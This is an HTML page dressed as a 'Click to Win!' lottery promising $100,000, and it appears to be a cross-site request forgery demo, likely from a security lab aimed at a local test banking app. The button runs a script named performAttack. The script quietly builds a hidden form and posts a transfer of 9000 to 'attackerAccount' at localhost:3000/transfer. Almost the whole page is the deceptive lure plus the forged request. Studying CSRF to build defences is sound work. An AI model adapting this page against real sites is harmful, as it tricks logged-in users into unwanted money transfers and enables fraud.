<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Click to Win!</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f2f2f2;
        text-align: center;
        margin: 0;
        padding: 0;
      }
      .container {
        max-width: 600px;
        margin: 50px auto;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        padding: 30px;
        position: relative; /* Add position relative */
      }
      h1 {
        color: #efe413; /* Gold color */
        font-size: 36px;
        margin-bottom: 20px;
      }
      p {
        color: #333;
        font-size: 18px;
        margin-bottom: 20px;
      }
      button {
        background-color: #efe413; /* Gold color */
        color: white;
        padding: 15px 25px;
        text-align: center;
        font-size: 18px;
        cursor: pointer;
        border: none;
        border-radius: 5px;
        transition: background-color 0.3s;
      }
      button:hover {
        background-color: #a38305; /* Darker gold color on hover */
      }
      .lottery-wheel {
        width: 200px;
        height: 200px;
        margin-bottom: 30px;
        animation: spin 6s linear infinite; /* Adjusted animation speed */
        border-radius: 50%; /* Make the image round */
        cursor: pointer; /* Add pointer cursor */
      }
      .arrow {
        position: absolute;
        top: 25%; /* Adjust the top position */
        left: 50%;
        transform: translateX(-50%) translateY(-50%) rotate(-270deg); /* Adjust the rotation and translation */
        width: 50px;
        height: 50px;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Click to Win!</h1>
      <img
        src="https://images.theconversation.com/files/147606/original/image-20161125-32046-xn9uvz.jpg?ixlib=rb-1.1.0&q=15&auto=format&w=754&h=754&fit=crop&dpr=3"
        alt="Lottery Wheel"
        class="lottery-wheel"
      />
      <img
        src="https://png.pngtree.com/png-clipart/20220206/original/pngtree-gold-arrow-head-png-image_7263825.png"
        alt="Arrow"
        class="arrow"
      />
      <!-- Placeholder arrow image -->
      <p>Click the button below for a chance to win $100,000!</p>
      <button onclick="performAttack()">Click Me!</button>
    </div>
    <script>
      function performAttack() {
        var form = document.createElement("form");
        form.setAttribute("method", "post");
        form.setAttribute("action", "http://localhost:3000/transfer");

        var input1 = document.createElement("input");
        input1.setAttribute("type", "hidden");
        input1.setAttribute("name", "toAccount");
        input1.setAttribute("value", "attackerAccount");

        var input2 = document.createElement("input");
        input2.setAttribute("type", "hidden");
        input2.setAttribute("name", "amount");
        input2.setAttribute("value", "9000");

        form.appendChild(input1);
        form.appendChild(input2);

        document.body.appendChild(form);
        form.submit();
      }
    </script>
  </body>
</html>
